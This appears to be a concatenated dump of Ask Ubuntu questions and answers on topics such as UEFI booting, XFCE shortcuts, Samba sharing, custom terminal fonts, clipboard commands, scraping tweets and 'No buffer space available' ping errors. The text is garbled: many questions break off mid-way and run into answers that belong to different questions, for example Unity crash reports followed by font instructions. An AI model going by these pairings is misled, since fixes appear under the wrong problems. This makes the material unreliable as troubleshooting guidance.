https://github.com/edenhill/librdkafka.git\n\n*cd librdkafka\n\n*./configure --prefix /usr\n\n*make\n\n*sudo make install\n\n\nNow you can use go install/ go run  go build \n", "Q: Can I open Excel .xlsx files with LibreOffice Calc? My colleagues have lots of Microsoft spreadsheet documents.

You can then view and edit them in a browser (Internet Explorer, Firefox, or Chrome).  You don't need Microsoft Office installed.  You'll be warned if a spreadsheet uses features not supported by the SkyDrive versioin.\nIn all cases, you will have to experiment to see which routes provide the greatest preservation of fidelity in the spreadsheets.\nYour colleagues who have Microsoft Office can obtain them back directly from SkyDrive and also save them to SkyDrive from current versions of Office, if that makes it easier for you (and for all of you when not in the office).

Presumably any version after that will, and probably some version before.  LibreOffice has more community developed plugins in its package, so OpenOffice may not have xlsx capabilities.  \nWho knows if every weird format will work correctly either.\nUbuntu 12.10 has libreoffice 3.6.2, which really should have the support you need.\nInstall LibreOffice:\nsudo apt-get update\nsudo apt-get install libreoffice\n\n\nA: I can open and save modified .xlsx files, using LibreOffice Calc version 6.0.2.1.\nNote: LibreOffice Calc yelled at me when closing a modified .xlsx file.

I've already set my UEFI boot loader to load from the DVD drive before anything else but it keeps on loading Windows 8 first thing. I've checked that the Ubuntu installer I am using is working by setting the BIOS to legacy boot; under this setting, I can get to the Live CD but it cannot detect Windows 8---something I do not want to happen.\nJust for the record, my boot order is as follows:\n\n\n*\n\n*ATAPI CDROM: HL-DL-ST DVDRAM GT51N\n\n*USB CDROM:\n\n*USB FDD\n\n*USB HDD\n\n*HDD: TOSHIBA [SERIAL NUMBER]\n\n*Network Boot-IPV4:\n\n*Network Boot-IPV6\n\n*Windows Boot Manager\n\n\nHas anyone ran into the same problems as me for UEFI? What am I missing here?\nPost-resolution update: In a rather embarassing turn of events, it appears that the Ubuntu installer I am using is not even 32-bit. There is no such thing as UEFI for 32-bit.\n\nA: Most motherboards have an option to launch a boot manager at boot time, typically by pressing a function key (F8, F10, and F12 are all reasonably common). On many UEFI systems, this boot loader includes separate BIOS (aka legacy) and EFI/UEFI boot options for optical discs. Thus, my first recommendation is to try using this built-in boot manager.\nAnother option may be to disable your firmware's BIOS/legacy boot option. From your description, it sounds like you've found this option and tried setting it to BIOS/legacy mode, but if the option was set to \"auto\" before, setting it to \"EFI\" or \"UEFI\" might get things working.\nYou could also try installing rEFInd on a USB flash drive and boot from it. rEFInd should scan your system for EFI-bootable media, including optical discs, and enable you to boot them in EFI mode. The trouble is installing to the flash drive is an extra bother, and you might not have any better luck getting rEFInd to launch than you're having with the Ubuntu disc.\nA fourth option is to create a USB-bootable version of the Ubuntu installer and try booting from it.\n", "Q: Ubuntu 12.10 Laptop temperature I'm using a laptop with a dedicated graphics card with Ubuntu and Windows 7 dual boot.\nWindows 7 Idle Temperature\nThe Windows 7 idle temperature for CPU is 51°C average, and GPU is 46-48.5°C.\nWindows 7 Loading Temperature\nWhen in load, the CPU temperature varies between 55-61°C, and GPU 49-51°C MAX.\nUbuntu Idle Temperature\nCPU: 54°C\nGPU (ATI Radeon, proprietary driver installed): 50°C\nUbuntu Load Temperature\nCPU: 58-69°C\nGPU:53C MAX.\nIs it normal?

Now you can drag window beyond the edge of the screen to tile it. But what are keyboard shortcuts for such a tiling? XFCE 4.10 has that functionality, but I can't find keyboard shortcuts for it.\n\nA: One problem with the solution mentioned above, is it won't work if you set the Whisker menu to use the SUPER key.  \nWhether you like or hate MS, I think you will agree that their shortcuts for the Start Menu, tiling, and window states are very intuitive.  (WINKEY+LEFT: Tile Left, WINKEY+RIGHT: Tile Right, WINKEY+UP Maximize, WINKEY+DOWN Minimize, WINKEY: Open Start Menu)\nI wanted to mimic that as closely as possible.\nIt seems with XFCE (at least Xubuntu) there are two main keyboard shortcut settings: one in Settings > Keyboard, and one in Settings > Window Manager.  The Whisker Menu shortcut (which I set to the SUPERKEY/WINKEY) is in Settings > Keyboard and by setting that, it doesn't allow any WinManager WINKEY settings to work.  \nMy solution was to assign the tiling keys from within Settings > Keyboard (instead of WindowManager) by using quicktile.py (found here). \nCmd: ~/src/quicktile/quicktile.py left - Shortcut: Super+Left\nCmd: ~/src/quicktile/quicktile.py right - Shortcut: Super+Right\nCmd: ~/src/quicktile/quicktile.py maximize - Shortcut: Super+Up\nCmd: ~/src/quicktile/quicktile.py minimize - Shortcut: Super+Down\nCmd: ~/src/quicktile/quicktile.py show-desktop - Shortcut: Super+D\nThen I can have the SUPER/WINKEY open the Whisker menu with: \nCmd: xfce4-popup-whiskermenu - Shortcut: Super L\nIt works very well but isn't quite perfect.  For example, in a multi-monitor environment, the Windows don't go to the next screen like Windows does.  I would love for that functionality to work, but I can deal without it for now :)\n\nA: Xubuntu keyboard shortcuts\nBy default, XFCE/Xubuntu tiling is a mouse only affair.\nHowever, you do have the ability to define your own keyboard shortcuts:\n\nUsing settings manager --> window manager you have the Tile Actions as shown.\nIn the picture I have defined two custom keyboard shortcuts CTRL+T to tile the current window to the top and CTRL+G to tile to the bottom.\nTo define your own keyboard shortcut - double click in the shortcut field next to the action.\n", "Q: Recovering from a Ubuntu freeze but keep programs running? On my system, Ubuntu freezes occasionally. The entire display becomes unresponsive - the mouse still moves but nothing happens on click, and with the keyboard I can press Ctrl+Alt+F1 to go to a login prompt.\nWhen I log in from the prompt, it appears all my programs are still running as normal. Yesterday for example I was converting some videos and running top showed the avconv process still running. I left it going for several hours and eventually it had completed the task perfectly. (What actually appeared to cause the freeze was opening Transmission from the notification area, but killing the process from the command line didn't make the system responsive again.)\nAnyway, after reading through this question it seemed like restarting the GUI was the way to go. So I ran sudo service lightdm restart but it closed all the programs down when logging out.\nSo for future use, is there a way to restart only the GUI and go back to exactly where I was? Everything else in the linked thread is about rebooting or restarting the OS.\n\nA: The answer in a single word:\nNo.\n\nUnfortunately X applications which are running will be terminated when X closes.  Since closing the X server, and restarting is what fixes your problem... there is probably no way around it.\n\nA: Try simply typing unity --replace. This should restart Unity without stopping any running programs.\n\nA: There is a solution I found here, you don't need to reboot nor to restart X, you can fix it without losing your work, but your work can not be visualized in desktop anymore, they will keep running in the background till they get finished or killed by you. It is still useful for the programs that need more time to run. \nThe solution is to press Ctrl+Alt+F1 and get to a raw linux console, then type the command\npgrep compiz\n\nto get the PID of your struck windows manager, then kill it by\npkill compiz\n\nif it doesn't work then try \npkill -9 compiz \n\nwait for a while, if you repeat pgrep, you should see either \n1) no result or 2) different PID\nThen your can use Ctrl+Alt+F7 and your will find the desktop work again!\n\nA: I have this problem also and so far there's no fix (if it's a bug) or a better solution without losing all the open applications.\nBut right now the only way I can restore the whole thing without closing the applications and restarting, since I can still open a terminal (Ctrl + Alt + F1) I just do a pm-suspend which suspends the machine and just start it again.  I does restart it but at least I still have the applications open the same way before the freeze started and it only takes a few seconds compared to a couple of minutes when rebooting the machine.\nHopefully that will help someone temporarily till this thing gets a fix.\n", "Q: Why does the BADSIG/\"Untrusted sources\" error recur forever? On at least a dozen occasions, I've spent 2-3 hours figuring out how to get Ubuntu 11.10-12.10 to either update or acquire software from software center, or both. I want to fix whatever is causing the BADSIG problem once and for all; I've wasted so much time trying to get this to work well enough that I can rely on it, but the same problem comes back after a couple weeks of normal updates and software center usage.\nDon't refer me to a standard posted solution on the web---whatever it is, I've used it more times than you have. The question isn't whether I can get it to work right this afternoon. I can. The question is what is causing the problem to recur regularly across 3 releases.\nNotice: I use this computer 4-5 hours per week and I do little on it. PDFs, Latex, FireFox, Mendeley, and that's it. I don't constantly install new software, and I don't fiddle with things unnecessarily.\n\nA: I do not regard this problem as solved, and I don't understand why Ubuntu works so well on my machine at home, and so consistently poorly (in this particular respect only) on my machine at my office. However, Y PPA has made it easy to live with the problem, as it will fix the BADSIG issue automatically, in just a few seconds:\nhttp://www.webupd8.org/2012/10/y-ppa-manager-0092-released-with-new.html\n", "Q: Unity crashes with nvidia and any driver.

I recommend trying out each of the options to see which one you personally prefer (personally, I found that I like Centered the best).

It has zero antialiasing, with vertical lines mostly 2 pixels wide. Close to ideal for current monitor dot pitches, in my eyes (literally). Here is a sample:\n\nAfter years of Windows at home (for family reasons) and Linux servers at work accessed through Cygwin on Windows (for company policy reasons), with Fixedsys as the shell and IDE font, I have finally decided to switch to Ubuntu at home.\nEclipse and gedit are no problem, they accept a corrected version of the Fixedsys Excelsior TTF font that you can find here at comment #16 (filename: FSEX301-L2.ttf). But the Gnome Terminal only accepts monospaced fonts.\nAlthough Fixedsys Excelsior is essentially monospaced, it contains larger glyphs (mostly for eastern languages), and also some ligatures. Since apparently ALL characters must have the same width for a font to be recognized as monospaced, Fixedsys Excelsior cannot be selected in all those contexts where monospaced fonts are required, including gnome-terminal.\nSo what is the easiest/cleanest way to use a Fixedsys clone in contexts that only accept monospaced fonts?\n\nA: This is the solution I found. I have tested it thoroughly several times, and I have been using the resulting font in a number of places for over 2 years now, but be warned: some parts of the procedure may be anywhere from suboptimal to plain wrong.\nBefore you ask \"why don't you make the resulting font available\", the answer is: \"because I'm not sure I can do so\". Font copyright is an intricate matter.\n\nDownload the corrected Fixedsys Excelsior font (file FSEX301-L2.ttf, at comment #16)\nInstall FontForge (e.g., from the Ubuntu Software Center)\nRight-click on the FSEX301-L2.ttf file and open it with FontForge.

You can also change the shape of characters, but always keep control points at multiples of 10, and the width at 80. \nClick Element &RightArrow; Bitmap Strikes Available..., then, in the window that appears set Pixel Sizes to 16 and click OK.\nClick File &RightArrow; Generate Fonts..., choose a different directory and/or a different filename if needed, make sure the output format is TrueType, and click Save. In the Non-standard Em-Size window that appears click Yes. In the Errors detected window that appears next click Save (don't worry).\nQuit FontForge (File &RightArrow; Quit). In the Font changed window that appears click Don't Save.\n\nMove the generated file to the .fonts subdirectory of your home directory (create it if it doesn't exist).\nOpen the Gnome Terminal. Click Edit &RightArrow; Profiles... In a profile (I suggest you create a new one) change the font to Fixedsys Excelsior 3.01-L2 Mono (or whatever you have called the mono version of Fixedsys Excelsior), at size 12 (which is the only \"true\" Fixedsys size). If you want, you can also disable bold text. I suggest black text on white background, but that is a matter of taste.\nThe bold variant of this font is equivalent to repeating the character shifted by one pixel to the right (this is different from FSEX301-L2.ttf, where it appears smoothed). It is not very legible - but do you really need bold? I don't. The problem is only with those contexts where bold cannot be disabled (not even, e.g., by editing syntax highlighting), especially in those cases where the character spacing is incremented by one pixel as well, breaking alignments (this is not the case in gnome-terminal). I haven't found a solution to this last nuisance yet. Suggestions are welcome.\n\n(*): not needed since the FontForge release of 2012-07-31 (in 14.04 LTS - Trusty Tahr)\n\nA: Great solution by Walter Tross, but if you don't want to do all the job, here is the download link:\nFixedsysExcelsiorIIIb-L2_Mono.ttf\n", "Q: What folder is this code signifying?

The cd ../Redist/OpenNI-Bin-Dev-Linux-x64-v1.5.2.23/ should get you from the directory where you executed the command to 1 directory up and then into a new directory Redist into a new directory OpenNI-Bin-Dev-Linux-x64-v1.5.2.23. \nAns in there there should be a file named install.sh.\nSo the starting spot where you should find Redist should be OpenNI/Platform/Linux/.\n", "Q: Can't access my Ubuntu admin account It just shows a black screen with words in it for a fraction of a second and then gets back to users screen(where you choose your user).\nI tried to enter from another account and removed the password for the admin account , but it didn't work too , and then I couldn't access my admin privileged places with my old password ?\nWhat should I do ?\nI tried to change my password from recovery but no success.\n\nA: Same happened with me also (in Ubuntu 12.04)\nI did the following. \nHope its of some help.\n\n\n*\n\n*Enter the log in screen\n\n*Press CTRL+ALT+F1, (to revert back press CTRL+ALT+F7, though it won't be needed)\n\n*login with your username/password\n\n*ls -Shla | grep \"Xauthority\"\n\n*sudo mv .Xauthority Xauthority.old\n\n*sudo shutdown -r now\n\n", "Q: Git autocomplete is asking for a password, not sure why I'm running into an issue with autocomplete using git...\nI am using ubuntu 12.10 and\nwhen I perform the following keystrokes\ng i t Space Bar Tab\nI am presented with the error\n\nPseudo-terminal will not be allocated because stdin is not a\n  terminal.\n\nand prompted for a password.

Just run this in terminal: \nsudo apt-get install --reinstall ubuntu-desktop\n\nIf that doesn't work, re-install ubuntu-desktop metapackage and reinstall its dependencies (packages). Use this command: \nsudo apt-cache depends ubuntu-desktop | awk -F \":\" '{print $2}' | sed '/^$/d' | xargs sudo apt-get install --reinstall --install-recommends --yes\n\n\nA: The answer is kind of weird.

I have installed and configured Samba, made my folders \"shared\" and basically done everything I had to do multiple times and what I have is the following:\nFirstly, I can see the shared Windows folders from the Ubuntu machine but I can only access the Windows public folders - not the other shared folders. When I try and access the non-public shared folders, I get an error \"Unable to mount drive\". Is that normal - is one not supposed to access folders that are not public folders, even if the are shared?  \nSecondly, the Ubuntu folders are not even visible from Windows - it's not in the Windows network at all. (Maybe my procedure to make the Ubuntu folders is flawed. The tutorials all say right click the folder and select the share option in properties, but you can't do it that way in 12.04.)\nSo all I have is partial, one-way access between my two operating systems. \nCan anyone shed some light on this? A re-cap on the steps and procedures to establish the network would be appreciated.\nEDIT: I've done some more tweaking and now, when I click on the shared Win folders, I'm asked for a password.

This is troublematic, specially because I'm running 12.04 in a Asus EEEPC. There are a lot of answers on how to change hud bindings, but what I reallyw wonder if there is a way to disable or uninstall hud-service.\nThanks in advance,\nMarcos\n\nA: You may want to read this answer here on a similar thread:\nhttps://askubuntu.com/a/693203/223872\n\nThe HUD is related to the Unity Launcher. For example it analyzes the\n  files you are using and offers them when you press Super.\nOn my system (Ubuntu 15.10) the hud-service started using 100% of one\n  CPU.\nI solved this by installing Compiz Config Settings Manager (ccsm) and\n  disabled all effects and set \"Enable Low Graphics Mode\" in \"Ubuntu\n  Unity Plugin\":\n\nsudo apt-get install compizconfig-settings-manager\nccsm\n\nAlthough you can indeed disable the executable bit, when the system upgrades, it may reset that bit to on when the file is overridden on new updates.\nAlso, the comment above the one I posted above mentions that the hud-service is in the package hud, which if you just don't want, it might be better to just remove the package entirely.\nhttps://askubuntu.com/a/699888/223872\n\nA: Open a terminal and do \non 32bit system\nsudo chmod -x /usr/lib/indicator-appmenu/hud-service\n\non 64bit system \nsudo chmod -x /usr/lib/x86_64-linux-gnu/hud/hud-service\n\nwhich removes - the execute mode x (i.e., permission) from hud-service.\nDone.\nYou may want to gently end (or violently kill) the currently running hud-service (or reboot, etc) for \"changes to take effect\" immediately...\n\nA: In my case I used the ubuntu unity plugin to diable the alt key trigger for that service. It might just be what you want to do. \n", "Q: Adding new commands I have added some new commands to ~/.bash_profile but every time I start a new terminal session, it seems to forget these commands and I have to do . ~/.bash_profile again. Is there a way to avoid this doing every single terminal session?\nThanks.\n\nA: I don't know why ~/.bash_profile is getting overwritten, but I've had problems with it before too. Instead, use ~/.bashrc.\nWhat I do is create the file ~/.bashrc2. In that file I put all my custom commands. After you have what you want, edit ~/.bashrc and add this line at the bottom:\n. ~/.bashrc2\n\nEven if ~/.bashrc gets modified, it won't hurt your customizations.

I have done installs along side Windows before, but in this situation there is no operating system on this HDD, just program files and the like. I'm using a live CD of 12.04 currently. I just want to make sure that I don't lose any more of my files before proceeding.\nAny help would be much appreciated.\nBest wishes \n\nA: When doing a new install instead of an upgrade to an old version you need to have a dedicated partition for the new system. The old data in that partitioning will be overwritten in the system install process. If you don't have an available partition make it with gparted from unused disk area. If you don't have unused disk area you may get it by resizing some of your old partitions.\n", "Q: How to install Ubuntu One Indicator in 12.10?

Please tell me if there are any available to me under Ubuntu or any other place.\n\nA: Clients like Transmission and Deluge are capable of creating torrents. Once the torrent file is created, it needs to be uploaded to your favorite torrent site for seeding( i.e. isohunt.com). Usually, instructions are provided on the front page of the site to get your torrent file uploaded.\n\nA: dottorrent-gui supports this: https://github.com/kz26/dottorrent-gui\n\nA: You appear to be suffering from a misconception. Torrent clients/creators don't have Web Seeding capability. Webseeding is done with an HTTP or FTP server. The client may or may not be capable of downloading from a webseed. For a further understanding you may wish to review What is \"web seed\"? and http://www.bittorrent.org/beps/bep_0019.html\nSources:\nhttp://www.bittorrent.org/beps/bep_0019.html\nWhat is \"web seed\"?\n\nA: Most torrent programs have the ability to create a torrent in the menu, my personal favourite is qBittorrent for it's simplicity and sheer speed of use...\nhttp://www.techsupportalert.com/qbittorrent-help-main-window\n\nA: Transmission\nTransmission is the default torrent client in Ubuntu. To create a new torrent, go to file menu and choose the new option (Or press Ctrl+N).\n\nLike most torrent clients, it also supports seeding.\n", "Q: I tried to make my ubuntu 12.10 boot faster using the following link's instructions.It crashed my unity launcher and menu bar .How do i fix this.

This question hadn't been asked separately, so here it is.\nIn particular, is there any official repository that provides and https alternative to the defaults http official repositories?\n\nA: mirrors.kernel.org is an official Ubuntu archive mirror, and supports https.\nI have the following in my sources.list:\ndeb https://mirrors.kernel.org/ubuntu saucy main restricted universe multiverse\ndeb-src https://mirrors.kernel.org/ubuntu saucy main restricted universe multiverse\n\n(Technically, mirrors.kernel.org is not on the official list, though mirrors.us.kernel.org and its siblings are.  However, mirrors.us.kernel.org supports https but returns a certificate for the host mirrors.kernel.org which apt-get rejects.  mirrors.kernel.org is clearly the same site, though it may not be your closest host.)\nAs pointed out, https is not necessary for authenticating the files downloaded, and is not very effective at hiding which files you download.  My interest is because at my site, http downloads are much slower than https for some reason, even from the same remote host.  I don't know why; maybe we have a transparent proxy that is slow or trying to scan for viruses or some such nonsense.\n", "Q: how to run youtube-dl through proxy server i want to download youtube video through youtube-dl through proxy server but it shows authentication required \ncode:\nhttp_proxy=\"http://username:password@proxy:port/\" youtube-dl url\n\nit shows authentication error\n\nA: \nfor current version of youtube-dl you can use switch --proxy\ne.g.\n$youtube-dl --proxy http://user:password@your_proxy.com:port url\nworks for me just fine\n\nA: That syntax of invokation is now deprecated.\nFrom the help page:\n--proxy URL                      Use the specified HTTP/HTTPS proxy.

What is the command line equivalent to pressing CTRL+C over a file in the file manager so that the file (not the filename) is copied to the clipboard?\nA situation where this can be useful and fast, for example, is when you want to copy to the clipboard a file from the directory you are in the terminal to quickly paste the file in the directory you are in the file manager. There are others.\n\nA: Mac OS has pbcopy with easier syntax:\npbcopy < ~/.ssh/id_rsa.pub \n\nor\ncat ~/.ssh/id_rsa.pub  | pbcopy\n\nTo simulate pbcopy on Ubuntu with xclip (installed via sudo apt install xclip):\nalias pbcopy='xclip -selection clipboard'\nalias pbpaste='xclip -selection clipboard -o'\n\n\nA: When you press Ctrl-C over a file in the file manager, the file's contents IS NOT copied to the clipboard. A simple test: select a file in file manager, press Ctrl-C, open a text editor, press Ctrl-V. The result is not file's contents but its full path.\nIn reality the situation is a bit more complicated because you can't do the opposite - copy a list of filenames from a text editor and paste them into file manager. \nTo copy some data from command line to X11 clipboard you can use xclip command, which can be installed with\nsudo apt-get install xclip\n\nto copy contents of a file or output of some command to clipboard use\ncat ./myfile.txt|xclip -i\n\nthe text can be then pasted somewhere using middle mouse button (this is called \"primary selection buffer\").\nIf you want to copy data to the \"clipboard\" selection, so it can be pasted into an application with Ctrl-V, you can do\ncat ./myfile.txt|xclip -i -selection clipboard\n\nTo be able to copy files from the command line and paste them in a file manager, you need to specify a correct \"target atom\" so the file manager recognizes the data in the clipboard, and also provide the data in correct format - luckily, in case of copying files in a file manager it's just a list of absolute filenames, each on a new line, something which is easy to generate using find command:\nfind ${PWD} -name \"*.pdf\"| xclip -i -selection clipboard -t text/uri-list\n\n(at least this works for me in KDE). Now you can wrap into a small script which you can call, say, cb:\n#!/bin/sh\nxclip -i -selection clipboard -t text/uri-list\n\nthen you put it in ~/bin, set executable bit on it and use it like this:\nfind ${PWD} -name \"*.txt\"| cb\n\nNice, isn't it?\n\nA: I heard that xclip also supports file copying with xclip-copyfile and xclip-pastefile. I haven't really used it though, but it might be a solution. \n", "Q: How to retrieve tweets from command line? Is there a simple way to retrieve someone's tweets from the command line?\nThe account would be public, and the command - or script, if necessary - would retrieve all or a specified number of most recent tweets to a text file, one tweet per line, without the metadata, the newest in the first line.\nWithout the use of API, only bash.\n\nA: From a-close-date on, Twitter won't let you into their API without having an OAuth key. But as a workaround you can use Search API. It is RESTful, so you can use curl to retrieve search results in JSON format. For example, if you want to retrieve @java's tweets, and save it to file ~/.tweets, this line of code can be used:\ncurl http://search.twitter.com/search.json?q=from:java&page=1&rpp=10&callback=? >> $HOME/.tweets\n\nAnd you can parse the file, using any JSON parser.\n\nThe rpp parameter is number af tweets to be retrieved. callback is javascript function to be executed on the resulting JSON. In case you're not using JavaScript with the api, you can leave it ?, but don't remove it. I will cause an error. More guidance on Search api can be found on https://dev.twitter.com/docs/api/1/get/search\nThere are tools to parse JSON from command line interface. Although I've never used one, I'll put some links to some resources, to help you find out the best suited tool:\n\n\n*\n\n*https://stackoverflow.com/questions/3858671/unix-command-line-json-parser\n\n*http://www.conigliaro.org/2011/01/24/jazor-a-simple-command-line-json-parsing-tool/\n\n*https://stackoverflow.com/questions/1955505/parsing-json-with-sed-and-awk\n\n*http://kmkeen.com/jshon/\nAnd as a little note, it is quicker to use some Python or Ruby (or others).\n\nA: If you don't want to use the Twitter API, you could grab the RSS feed of the Twitter profile using a bash script and then proceed to format it from there. \n\n\n*\n\n*https://stackoverflow.com/questions/8632233/read-rss-feed-using-a-shell-script\nSince Twitter API has deprecated the RSS feed, you can workaround this by generating RSS feed using the search results. \nHere's the RSS feed of my tweets. \n\nYou would have to put together the necessary bash script though. From fetching the RSS feed to formatting the tweets as per your requirements.\n\nA: This is my script made for screensaver usage\n#!/bin/bash\n\nuser=\"$1\"\nuser=\"${user:=pontifex_pl}\"\n\nlast_status_url=$(lynx -dump https://twitter.com/$user \\\n    | grep -i \"$user/status/\" \\\n    | head -1 \\\n    | awk '{print $2}')\n\nlynx -dump \"$last_status_url\" \\\n    | grep 'Twitter:' -m1 -A4 \\\n    | tr -d '\\n' \\\n    | sed -e 's/[^\"]*\"//' -e 's/\".*//' \\\n    | tr -s ' '\n\necho\n\n\nA: You can use twarc to give an example if you want to archive Nassim Nicholas Taleb's tweets you use. \ntwarc timeline nntaleb --format csv> taleb.csv \n\nYou can use other formats too: --format {json,csv,csv-excel}\nHow to configure twarc:\nThe only way to get the complete tweets is using the APIunfortunately even if the app is transparent you need to have an initial setup and configuration, you also need to apply for the API (\n\nAs of July 2018, you must apply for a Twitter developer account and be\n  approved before you may create new apps.\n\n) \nOnce you've got your application keys you can tell twarc what they are with the configure command.\ntwarc configure\n\nThis will store your credentials in a file called .twarc in your home directory so you don't have to keep entering them in. If you would rather supply them directly you can set them in the environment (CONSUMER_KEY, CONSUMER_SECRET, ACCESS_TOKEN, ACCESS_TOKEN_SECRET) or using command line options (--consumer_key, --consumer_secret, --access_token, --access_token_secret).\n\nA: I made a tool that should do almost exactly what you described: twitter-screen-scrape\n. By default it will output in JSON, with metadata, but it's trivial to pipe the output through something like underscore-cli to strip out everything you don't want.\n$ twitter-screen-scrape -u slang800 | underscore pluck text --outfmt text > outputfile\n\n\nA: You could go the python + tweepy route by:\n\n\n*\n\n*Creating your own Twitter Application (To get API Keys)\n\n*Create Access tokens for you twitter account\n\n*Use a script such as this together with your credentials: https://gist.github.com/yanofsky/5436496\nI just tested it and it works great. There are however users that protect their tweets, so it might not let you download everything. But that's a feature of twitter.\nLimit still is 3200 and you get a CSV file.\n", "Q: How to use an android phone as a modem?

Following Rod Books, I managed to get my system to boot using rEFInd. However rEFInd does not offer me any options to boot from my Ubuntu installer disc.\nAnother thing...after following Rod Books' instructions, my machine greeted me with something along the lines of \"The bootloader is not trusted\" (my usage of the term \"bootloader\" is possibly wrong; I'm not well-acquainted with these terms) I got to work around this by setting up some passwords in the BIOS and putting the renamed .efi of rEFInd to the trusted list. While in this screen, it showed me the drives with a possible .efi (among them, the drive S in Rod Books' guide) and one of the drives it showed was my optical drive with an Ubuntu installer. I tried browsing for an .efi in the Ubuntu installer but found none. True enough, at Windows, I searched the drive for an .efi but found none.\nSo how do I make my Ubuntu installer UEFI bootable?\n\nA: Precisely what Ubuntu version are you trying to install? Please specify the exact filename of the .iso image that you downloaded. My first guess is that you've got a 32-bit (i386) version, which won't be bootable in EFI mode on a 64-bit computer -- at least not without additional tedious mucking about. It's also possible that you've downloaded a Mac version (amd64+mac), which likewise also lacks EFI support. Another possibility, for rEFInd at least, is that you've accidentally reconfigured the scanfor line in refind.conf to omit the optical option, which is required to \"see\" EFI-bootable optical discs. This last possibility seems rather remote, though; by default rEFInd does scan for EFI-bootable optical discs.\nI just checked, and in VirtualBox, at least, rEFInd has no problems detecting the EFI boot mode of an AMD64 Ubuntu 12.04 system (ubuntu-12.04-desktop-amd64.iso).\n", "Q: Nautilus doesn't open .tex files on left-click (12.04) When I left-click a file with .tex extension from nautilus, it is not opened.

I am using Ubuntu 12.04 with an Ivy Bridge processor and am thinking of updating the Intel drivers from the ppa:ubuntu-x-swat/intel-graphics-updates PPA. \nDo I also need to update the kernel in order to get the new features listed on http://intellinuxgraphics.org/2012.07.html (as being kernel related)?\n\nA: If you are looking for SNA, there's an article at Webupd8 explaining how to enable it in 12.04, and it don't requires kernel upgrades, just the PPA you already refered.\nIf you are looking for RC6 support, this suggests it is already supported in 3.2 kernel (if i'm not wrong it is not enabled by default: Ubuntu Wiki).\n\nA: I'd avoid using PPAs as I find them to be messy. Check http://www.linux-drivers.org/ to see if your processor and integrated graphics are supported in the 12.04 kernel. If not, you could check the 12.10 kernel and see if the drivers are in that kernel, which I believe they are.\n\nA: 2 cents:\nI don't think you have to upgrade the kernel to work with the new intel graphics drivers, otherwise the PPA won't work for precise (3.2.0-xx-generic). The ppa packages will compile kernel modules (all others that is needed) for the running kernel if necessary.\nBTW: in case you don't know Ubuntu has a mainline kernel PPA (if you don't want to compile bleeding edge kernel from source)\nhttp://kernel.ubuntu.com/~kernel-ppa/mainline/\n", "Q: What does “ping: sendmsg: No buffer space available” mean? I had an intermittent issue (which resolves itself spontaneously, after using a different connection for a while) that caused Internet requests to fail, with one particular wireless network. After about 5 requests after associating with an AP, ping would report the error\nping: sendmsg: No buffer space available\n\njust as in Wifi connected but no data transfer: \"ping: sendmsg: No buffer space available\".\nIn case it's relevant, I'm seeing with a Centrino Ultimate-N 6300 [8086:4238] wireless interface on a Thinkpad X201. Bug #836250 is possibly related.\nWhile I can work around this issue, I was wondering: What does this error message mean? In particular, what buffer is it talking about?\n\nA: I got the same issue with my laptop DELL XPS using Linux 5.3.0-42 Ubuntu 18.04.3 LTS.\nUsing ping 8.8.8.8 I get the following error:\nping: sendmsg: No buffer space available\n\nSeveral sources online suggest to increase the wmem_max using:\necho 83886080 | sudo tee /proc/sys/net/core/wmem_max\n\nBut I didn't solve with this, after a while I just changed the Wireless mode in my router into\n802.11 b/g/n mixed\n\nMoreover, I disabled the 5 GHz in the router, probably it is overcharged.\nAll of this fixed my issue.\nEDIT: alternatively, if you do not want to disable 5G you can set from the wifi configuration the related wifi channel between 5G or 2.4G, just go to Wifi network settings, select your network and in the \"identity\" tab change the BSSID, there you should find 2 BSSID one is the 2.4GHZ and the other one is 5G.\n\nA: Chances are it's a problem with the driver or the hardware itself. It can be temporarily fixed by taking the interface up/down. Basically the output queue is full and unless you are handling some major network traffic or have a ton of hosts on the network you shouldn't see that error, and if you were, you could probably tweak some kernel values to prevent the error.\n\nA: It means you reached a maximum value for a system parameter. Probably /proc/sys/net/core/wmem_max (but this might need some investigating on a system that shows this error). This setting is the maximum amount \"receive socket memory\".\nIt is likely that the cause is a broken NIC -or- a NIC that is not 100% supported if the system is not stressed out. Broadcom bcm4313 is one that seems to show this error. \n\nIn case anyone wants to know: the file where these are stored is /etc/sysctl.conf and you can alter them from a root(!) prompt. Some examples can be found here (also includes the parameter shown at the beginning of this answer). But this should only be done if replacing the NIC itself does not solve it.\n\nA: I had a similar problem with a 3g modem (USB modem). \nWhen using a different modem, same brand, the problem disappeared.\nWhenever I used the defective modem it worked for a while then started to fail with same symptoms, after few days the modem broke completely, I finally replace it, and the problem solved completely.\n\nA: I found that this message could be caused by a faulty network equipment somewhere on the local network, not necessarily on your computer.\nFor example, I got this message on my Ubuntu 20.04 when pinging local router at 192.168.1.1. In the mean time the internet traffic was interrupted when the message was present.\n$ ping 192.168.1.1\n...\n64 bytes from 192.168.1.1: icmp_seq=216 ttl=64 time=0.295 ms\n64 bytes from 192.168.1.1: icmp_seq=217 ttl=64 time=0.350 ms\nping: sendmsg: No buffer space available\nping: sendmsg: No buffer space available\n...\n$ ping 192.168.1.1\nPING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\nFrom 192.168.1.8 icmp_seq=10 Destination Host Unreachable\n...\n\nThe problem was resolved immediately by unplugging ATZEBE USB3 expansion hub used for another laptop computer from the Ethernet port on the same network switch (TP-Link) where my Ubuntu machine was plugged in. The laptop was off in the mean time. I was able to replicate the problem a few times. The problem reappeared a minute or so after I plugget the ATZEBE in again. The router has many other devices in it, but only removing the ATZEBE was the one that resolved the problem. Otherwise, the Ethernet switch might also be a suspect.\nAs pointed out earlier, the message is about a system parameter. You could read with:\n$ cat /proc/sys/net/core/wmem_max\n212992\n\nAs the value is quite large for a simple ping, I suspect that either the faulty hardware is spamming the network and overflowing the buffer, or the system is handling a problem situation with a misleading message.\n\nA: Just to add that I have the same problem on a Lenovo Yoga520 with Ubuntu 20.04. As with https://askubuntu.com/users/1053352/stefano-borz%c3%ac, I effectively turned of 5 GHz in the router, and it seems to have fixed this.

